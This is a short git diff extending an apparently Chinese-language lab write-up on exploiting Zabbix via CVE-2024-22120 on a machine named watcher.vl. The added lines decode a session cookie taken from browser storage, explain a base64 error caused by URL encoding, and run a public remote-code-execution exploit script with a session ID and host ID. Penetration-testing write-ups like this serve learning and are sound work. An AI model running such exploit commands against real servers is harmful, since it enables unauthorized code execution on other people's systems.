@@ -70,4 +70,12 @@ https://github.com/W01fh4cker/CVE-2024-22120-RCE/blob/main/CVE-2024-22120-RCE.py
 #### 在Inventory -> Hosts 鼠标移到 'Zabbix server' 
 #### 左下角就会显示http://zabbix.watcher.vl/hostinventories.php?hostid=10084
 #### 主机 ID 为 10084 ，这是“库存”中的 Zabbix 服务器。我们将对 cookie 进行 base64 解码，并使用 sessionid 键。
-#### 
+#### Fn12 -> Storage -> Value 粘贴cooike
+```
+[★]$ echo 'eyJzZXNzaW9uaWQiOiI4MWI3ZThiMDBkMWUyYWQ5Yjg2ZmI3YjFlMGIwZTdmYSIsInNlcnZlckNoZWNrUmVzdWx0Ijp0cnVlLCJzZXJ2ZXJDaGVja1RpbWUiOjE3NzI2MzQ5NjMsInNpZ24iOiJkNGRjYjhkNzdjY2NmYmY0YzMyOWU3MTQxMTJhYzNmNWE2NmIxOWRiOTIxOGZkODA0YzI4ZTJkNmE0Yzc1MmU1In0%3D' | base64 -d
+{"sessionid":"81b7e8b00d1e2ad9b86fb7b1e0b0e7fa","serverCheckResult":true,"serverCheckTime":1772634963,"sign":"d4dcb8d77cccfbf4c329e714112ac3f5a66b19db9218fd804c28e2d6a4c752e5"}base64: invalid input
+```
+#### base64: invalid input的原因是       ’ %3D = URL 编码后的 =‘
+```
+[★]$ python3 CVE-2024-22120-RCE.py --ip zabbix.watcher.vl --sid d4dcb8d77cccfbf4c329e714112ac3f5a66b19db9218fd804c28e2d6a4c752e5 --hostid 10084
+```
